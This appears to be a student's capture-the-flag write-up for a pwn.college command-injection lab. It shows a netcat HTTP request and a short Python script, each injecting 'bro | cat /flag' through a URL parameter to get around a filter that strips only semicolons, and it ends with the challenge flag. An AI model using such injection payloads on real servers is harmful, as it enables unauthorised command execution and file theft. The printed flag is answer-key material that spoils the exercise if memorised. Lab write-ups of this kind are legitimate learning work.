# challenge: CMDi 2

📅 2026-01-21
📁 web security

---

## ✅ what i did  
I WAY -> netcat
-clicked start
-opened the terminal
-ran: 'cat /challenge/server'
found the endpoint is stil /mission
this time the server does the same as previous challenge but replace ";" with ""
-ran: '/challenge/server"
-ran: 'nc -v challenge.localhost 80'
-typed: 'GET /mission?directory-path=bro%20%7C%20cat%20%2Fflag HTTP/1.1'
        'Host: challenge.localhost'
-flag popped out

II WAY -> python
-opened the terminal
-ran: 'vim bro'
-typed: '#!/usr/bin/env python3'
        'import requests'
        'from pwn import *'
        'context.log_level = 'error''
        'p = process("/challenge/server")'
        'time.sleep(1)'
        'url = "http://challenge.localhost:80/mission"'
        'params = {'
                '"directory-path" : "bro | cat /flag"'
                '}'
        'r = requests.get(url, params)'
        'print(r.text)'
-flag popped out

## 🧑🏾‍🏫 what this challenge teaches u
to exploit the vulnerability even if the server does a simple check as replacing ";" with "", u can pipe the command using |

## 🏁 Flag  
pwn.college{AWE23lMr27EeQJNBSZ3KtX50Y5h.QX0YTN2wCO4IDOxEzW}
